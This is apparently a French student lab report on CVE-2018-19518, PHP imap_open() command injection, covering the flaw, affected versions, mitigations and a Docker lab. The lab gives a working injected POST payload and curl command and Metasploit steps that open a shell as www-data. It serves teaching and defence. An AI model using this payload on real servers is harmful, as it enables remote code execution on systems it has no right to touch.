Sécurité - CVE-2018-19518
=========================
#### Cyril Dussert, Emilien Mottet

## Service compormis
La faille de sécurité étudiée (CVE-2018-19518) concerne la fonction ```imap_open()``` dans PHP.

## Description de la vulnérabilité
Cette faille permet une exécution de code arbitraire sur le serveur exécutant le code PHP.

Cette faille existe car la fonction `imap_open` de PHP ne filtre pas correctement les noms d'hôte des boîtes mail avant de les passer aux protocoles __rsh__ et __ssh__. Ainsi, si _rsh_ et _ssh_ sont activés sur le serveur, et que la commande __rsh__ est un lien symbolique de la commande __ssh__ (comme c'est le cas sur les systèmes Debian et Ubuntu), un attaquant peut exploiter cette vulnérabilité en envoyant un nom de serveur IMAP malicieux, contenant l'argument _-oProxyCommand_ au serveur.

Le succès de l'exploitation de cette faille pourrait permettre à l'attaquant de passer outre la désactivation des fonctions _exec_ sur le serveur hébergeant l'application PHP.
Ainsi, l'attaquant peut exécuter les commandes shell de son choix sur le serveur hébergeant l'application PHP.

Pour passer les commandes bash à exécuter, nous allons les encoder en base 64, de manière à prévenir au maximum les sécurités qui auraient pu être mises en place côté serveur.

Voici la signature de la fonction `imap_open()` :
```php
resource imap_open ( string $mailbox , string $username , string $password [, int $options = 0 [, int $n_retries = 0 [, array $params = NULL ]]] )
```
C'est bien entendu le premier paramètre, `$mailbox` qui nous intéresse ici, c'est sur ce paramètre, qui décrit le nom d'hôte de la boite mail IMAP, que nous allons passer le code malicieux.
Un exemple concret est disponible dans la section de l'expérimentation.

PHP a confirmé cette faille, et a proposé un patch logiciel. Cependant, ce patch désactive juste l'utilisation de rsh par défaut lors de l'utilisation de `imap_open()`. On cache seulement la faille, sans réellement la corriger.
Cependant, il semblerait que l'implémentation de ce protocole IMAP est géré par une librairie C sous-jacente, que PHP utilise (voir le [BugZilla](https://bugs.php.net/bug.php?id=77153)).
Malheureusement, cette librairie n'a plus l'air maintenue et les développeurs de PHP n'ont pas de contrôle dessus. La vérification des paramètres s'effectuant au sein de la librairie C, il n'est pas possible pour les développeurs de PHP d'effectuer une vérification des champs simple.

Un commit (*e5bfea64c81ae34816479bb05d17cdffe45adddb*) désactive par défault le login ssh et le login rsh et laisse la possibilité de l'activer via un paramètre non sécurisé (*imap.enable_insecure_rsh*). Cependant, si ce paramètre est activé, l'exécution de code sur le serveur est toujours possible. Au final, on peut dire que la faille n'est même pas corrigée, juste cachée par défaut.
Dans le cas où le développeur a besoin d'activer rsh, la faille réapparaît... Cela paraît dangereux...

## Cible de la faille
Comme décrit ci-dessus, les cibles concernées par cette faille sont les différentes version de php publiées avant ce commit *e5bfea64c81ae34816479bb05d17cdffe45adddb*

### Versions concernées
Les version maintenues de PHP étant vulnérables sont :
- PHP < 5.6.39
- PHP < 7.0.33
- PHP < 7.1.25
- PHP < 7.2.13
- PHP 7.3.0

Bien entendu, les versions non maintenues (ex : PHP 5.5.x) sont vulnérables.

## Exemple d'architecture
N'importe quelle application écrite en php utilisant `imap_open()`. En application concrète on peut imaginer un webmail écrit en php, ce qui est le cas le plus simple.

Cependant, des CMS connus utilisent aussi cette fonction dans leur fonctionnement. C'est le cas de Prestashop, dans ses versions les plus récentes, ainsi que SuiteCRM et e107.

Prenons le cas d'un site de vente en ligne utilisant Prestashop. C'est un système très simple à mettre en oeuvre, même pour des non-informaticiens. Cependant, la configuration de sécurité du serveur sous-jacent n'est pas à la portéé de tous, pas même d'un "simple" développeur PHP.
La seule sécurité présente sur Prestashop est qu'il faille accéder à l'interface d'adiministration afin de pouvoir paramétrer un serveur IMAP.

Les failles de sécurité étant courantes sur ce système (voir [CVE-2018-8824](https://nvd.nist.gov/vuln/detail/CVE-2018-8824) et plus généralement [ce lien](https://www.getastra.com/blog/911/prestashop-pirate-ces-vulnerabilites-peut-etre-la-raison/)), une simple faille d'injection SQL pourrait permettre de créer ou de s'approprier un compte administrateur et ainsi exploiter la faille qui nous intéresse.

## Préconisations de sécurité
Etant donné qu’il n’y à pas de workaround directement accessible pour palier cette faille, la
meilleure solution pour s’en protéger est de mettre à jour régulièrement les librairies présentes
sur le serveur. Peu de temps après la découverte de la faille, un patch correctif était disponible.

De plus nous conseillons de s'assurer des services exposés sur le serveur. Combien de sysadmins sont capable de définir rsh sur leur machine ?

Une fois de plus, s'abonner à des flux de nouvelles concernant la sécurité des systèmes utilisés au sein de l'infrastructure me paraît indispensable.

### Bonnes pratiques à mettre en oeuvre

Comme d'habitude, il est tout d'abord d'usage d'appliquer le principe du moindre privilège sur le serveur hébergeant l'application. Lorsque l'on exploite la faille, on accède au serveur en tant que l'utilisateur qu'utilise Apache pour s'exécuter. Ainsi, il paraît être une __très mauvaise idée__ que d'utiliser `root` pour exécuter Apache.
De plus, il convient de restreindre les droits accordés à www-data au strict minimum.

D'un côté plus logiciel, l'extension de PHP qui ajoute les fonctions imap à PHP (le paquet __php_imap__) n'est pas installé par défaut sur le système. Si vous n'utilisez pas ces fonctions, il convient de désinstaller ce paquet.

## Améliorer le développement

Sur une application qui utiliserait de telles fonctions, il me paraît essentiel d'effectuer une validation des noms d'hôtes des boîtes mail passées en paramètre. Par exemple, on peut interdire tout nom d'hôte contenant des arguments (tels que _-oProxyCommand_).

Ajouté à ça l'utilisation du flag _/norsh_ par défaut lors de l'appel à la méthode, on peut réduire drastiquement l'effet de cette faille.

## PSSI
Nous imaginons que nous sommes un éditeur logiciel qui propose un progiciel pour des sites de vente en ligne (prestashop like). Avec un module de création de tickets par e-mail. 

### Criticité de la faille et potentiel impact
La faille n'est pas disponible pour tout les utilisateurs. Seuls les administrateurs ayant les droits pour modifier le serveur mail de réception disposent d'un accès à la faille.
Seulement, si un utilisateur malicieux exploite une autre faille qui lui permet d'accédder à l'administration, il n'y a plus de sécurité.

La faille est 

### Action préventive et curative

### Formation des utilisateurs à envisager

## Expérimentation 
### hands on expérimentation 
Lancer l'image docker 
```console
docker-compose up -d --build --force-recreate
```

Vous trouverai à l'url http://localhost une application web. Cetta application compte le nombre de mail sur votre boîte maîl.

Par exemple avec votre compte mail de grenoble-inp.org:
- imap : webmail.grenoble-inp.org
- user : prenom.nom@grenoble-inp.org
- password : xxx

possibilité que ça ne fonctionne pas simplement avec gmail (protection de google) voir dans le répository git dans le dossier docs/gmail.png.

Maintenant nous allons réalisé l'exploit. Comme expliqué il est possible d'injecter du code bash dans le champs pour le serveur imap.

La commande que nous allons executé sur le serveur est celle-ci ``` echo '1234567890'>/tmp/test0001```. Pour faciliter l'injection on converti le message du echo en base64.

voici l'appel http que nous souhaitons réaliser.
```HTTP
POST / HTTP/1.1
Host: your-ip
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 125

hostname=x+-oProxyCommand%3decho%09ZWNobyAnMTIzNDU2Nzg5MCc%2bL3RtcC90ZXN0MDAwMQo%3d|base64%09-d|sh}&username=111&password=222
```

Nous vous conseillons d'utiliser votre navigateur web, burp(outil vu lors du hands on pentest), ou curl (tout simplement !).

### solution avec curl
  ```console
  $ curl 'http://localhost:80/' --data 'hostname=x+-oProxyCommand%3decho%09ZWNobyAnMTIzNDU2Nzg5MCc%2bL3RtcC90ZXN0MDAwMQo%3d|base64%09-d|sh}&username=111&password=222'
  ```

### solution avec firefox 
  - ouvrir l'onglet Network de l'outil web developper (ctrl+shit+E)
  - clicker sur le bouton reload de l'outil web developper. Clicker sur le bouton submit de l'application web (peut importe le contenu des champs)
  - vous allez voir apparaître une requête POST dans votre navigateur, faite un clic droit dessus et choisissez l'option edit and ressend ou clic gauche et un bouton edit and ressend et présent juste à coté du cote retour (voir screenshot).
 ![web developper tool firefox](docs/firefox-dev.png "web developper tool firefox") 
 - Editer la requete en adaptant le request body avec cette string `hostname=x+-oProxyCommand%3decho%09ZWNobyAnMTIzNDU2Nzg5MCc%2bL3RtcC90ZXN0MDAwMQo%3d|base64%09-d|sh}&username=111&password=222`
 ![editer la requête](docs/edit-request.png "editer la requete") 
  

Ensuite nous allons vérifié que la commande a bien été executée.
```console
$ docker-compose exec app bash
# ls -l /tmp
```


Il est possible de recommencer la manipulation avec un waf (web application firewall pour notre application web). Il faut utiliser le fichier docker-compose-waf.yml au lieu docker-compose.yml.

```console
docker-compose -f docker-compose-waf.yml up -d --build --force-recreate
```

```console
docker-compose -f docker-compose-waf.yml exec app bash
```
mais on remarquera le waf n'est pas efficace dans notre cas 


### metasploit module
[source](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/linux/http/php_imap_open_rce.md)

```console
docker-compose -f docker-compose-msf.yml up -d --build --force-recreate
```
run metasploit
```msf
msf5 > use exploit/linux/http/php_imap_open_rce 
msf5 exploit(linux/http/php_imap_open_rce) > set target 3
target => 3
msf5 exploit(linux/http/php_imap_open_rce) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf5 exploit(linux/http/php_imap_open_rce) > set rhost 127.0.0.1
rhost => 127.0.0.1
msf5 exploit(linux/http/php_imap_open_rce) > exploit
```

and now you have a bash 

```console
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

## Références
* [Documentation sur imap_open()](http://php.net/manual/fr/function.imap-open.php)
* [BugZilla PHP](https://bugs.php.net/bug.php?id=77153)
* Notre repo [github](https://github.com/ensimag-security/CVE-2018-19518)
